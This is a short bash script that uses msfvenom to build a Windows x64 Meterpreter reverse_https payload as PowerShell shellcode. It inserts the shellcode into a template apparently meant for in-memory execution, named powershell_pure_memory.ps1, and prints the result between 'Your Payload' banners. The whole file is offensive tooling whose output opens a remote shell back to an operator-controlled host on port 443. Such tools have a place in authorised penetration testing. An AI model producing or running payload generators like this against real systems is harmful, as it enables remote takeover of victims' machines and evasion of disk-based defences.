#!/bin/bash
LHOST="eth0"
LPORT=443
ARCH="x64"
PAYLOAD="windows/x64/meterpreter/reverse_https"

SHELL_CODE=$(msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" EXITFUNC=thread -f ps1 -a "$ARCH" --platform windows)

# printf, not echo: escape sequences are not expanded by echo without -e, and
# the banner relies on \n and the colour codes coming out as control characters.
printf '\n \e[31m=================================================== Your Payload  =================================================== \e[0m \n\n'
sed "s/\[\[\[SHELL_CODE]]]/$SHELL_CODE/g" powershell_pure_memory.ps1
printf '\n\n \e[31m=================================================== Your Payload End =================================================== \e[0m \n'
